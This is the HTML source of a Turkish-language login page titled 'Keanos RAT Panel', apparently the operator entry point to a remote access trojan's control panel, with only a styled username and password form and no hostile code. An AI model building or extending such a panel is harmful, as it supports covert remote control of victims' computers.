<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Keanos RAT Panel - Giriş</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <style>
        body { background: #181b21; }
        .login-box { max-width: 400px; margin: 100px auto; background: #23272f; border-radius: 16px; box-shadow: 0 0 16px #0008; padding: 32px; }
        .logo { font-size: 2.2rem; color: #00ff99; font-weight: bold; margin-bottom: 24px; text-align: center; letter-spacing: 2px; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">Keanos RAT</div>
        <form method="post">
            <div class="mb-3">
                <label class="form-label">Kullanıcı Adı</label>
                <input type="text" name="username" class="form-control" required autofocus>
            </div>
            <div class="mb-3">
                <label class="form-label">Şifre</label>
                <input type="password" name="password" class="form-control" required>
            </div>
            <button type="submit" class="btn btn-success w-100">Giriş Yap</button>
        </form>
    </div>
</body>
</html>
